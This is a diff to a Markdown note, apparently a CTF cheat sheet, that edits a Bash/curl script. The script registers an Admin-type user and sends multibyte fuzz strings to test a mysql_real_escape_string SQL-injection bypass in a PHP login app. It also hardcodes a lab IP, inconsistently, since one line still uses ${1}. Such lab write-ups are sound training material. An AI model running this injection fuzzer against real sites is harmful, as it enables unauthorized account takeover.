@@ -182,6 +182,7 @@ NOT zero
 ```
 
 ## Automate user creation and test for mysql_real_escape_string bypass
+The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
 Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:
 ```BASH
 #!/bin/bash
@@ -192,31 +193,31 @@ fuzz="뽜’’AA"
 name="‘¿’’AA"
 ip="10.10.10.10"
 echo "Creating User: ${email}"
-curl -i -b 'cookies.txt' -c 'cookies.txt' -d "name=${name}&email=${email}&password=${password}&type=Admin" "http://${1}/index.php" 2>/dev/null
+curl -i -b 'cookies.txt' -c 'cookies.txt' -d "name=${name}&email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null
 echo " "
 echo "============================================"
 echo "Login as User"
 echo "============================================"
-curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${1}/index.php" 2>/dev/null  | grep 'location'
+curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null  | grep 'location'
 echo " "
 echo "============================================"
 echo "Check user profile with cookie"
 echo "============================================"
-curl -b 'cookies.txt' "http://${1}/index.php" -v 2>/dev/null | grep 'td align="center"'
+curl -b 'cookies.txt' "http://${ip}/index.php" -v 2>/dev/null | grep 'td align="center"'
 echo " " 
 echo "============================================"
 echo "Change Name"
 echo "============================================"
 curl -b 'cookies.txt' -d "name=${fuzz}&type=Admin" "http://${1}/index.php" 
 echo " " 
-curl -b 'cookies.txt' 'http://10.10.10.176/profile.php' 2>/dev/null | grep 'td align="center"'
+curl -b 'cookies.txt' "http://${ip}/profile.php" 2>/dev/null | grep 'td align="center"'
 echo " "
 echo " DELETEING COOKIE "
 rm cookies.txt
 echo "============================================"
 echo "Relogin as User - did password change?"
 echo "============================================"
-curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${1}/index.php"  2>/dev/null  | grep 'location'
+curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php"  2>/dev/null  | grep 'location'
 echo " " 
 echo " DONE!"
 echo " DELETEING COOKIE "
